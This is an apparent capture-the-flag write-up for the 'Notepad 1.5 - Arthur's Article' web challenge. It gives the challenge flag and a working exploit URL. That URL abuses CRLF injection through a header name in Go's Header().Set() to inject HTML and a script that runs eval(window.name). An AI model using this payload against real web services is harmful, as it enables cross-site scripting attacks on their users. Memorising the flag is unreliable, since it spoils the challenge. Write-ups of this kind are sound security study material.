# Notepad 1.5 - Arthur's Article

### Challenge Description

Arthur Morgan was asked to retrieve an important article from Cornwall's computer. Help him steal it. 

### Challenge File
[Source](./Handout/arthursarticle.zip)

### MD5 Hash: 
`0bac8f0037b5c3da16c78a24e0a0932e`


### Short Writeup

* Exploit CRLF in go's Header().Set() library to inject arbitrary html using the header name. 

* `http://chall.notepad15.gq/find?startsWith=asd&debug=2&A:asd%0AContent-Type:text/html%0A%0A%3Chtml%3E%3Cscript%3Eeval(window.name)%3C/script%3E`


### Author
[Az3z3l](https://twitter.com/Az3z3l)

### Flag
`inctf{red_dead_rezoday_ialmvwoawpwe}`